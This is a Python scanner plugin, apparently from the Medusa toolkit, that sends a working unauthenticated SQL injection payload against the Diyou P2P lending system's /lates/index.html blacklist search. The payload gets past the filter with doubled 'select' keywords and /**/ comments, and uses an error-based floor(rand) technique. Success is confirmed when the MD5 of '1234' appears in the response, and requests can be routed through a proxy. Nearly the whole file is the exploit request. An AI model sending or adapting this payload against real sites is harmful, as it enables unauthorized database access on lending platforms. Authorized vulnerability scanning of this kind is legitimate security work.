#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 帝友P2P借贷系统无需登录SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2011-150130
author: Ascotbe
reference: Lucifer
description: 帝友P2P借贷系统/lates/index.html逾期黑名单搜索处过滤了select和空格，利用/**/和双写select可以绕过
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/lates/index.html?username=123%27/**/and/**/(seleselectct/**/1/**/from/**/(selselectect/**/count(*),concat(0x7e,MD5(%271234%27),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url,headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在帝友P2P借贷系统 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass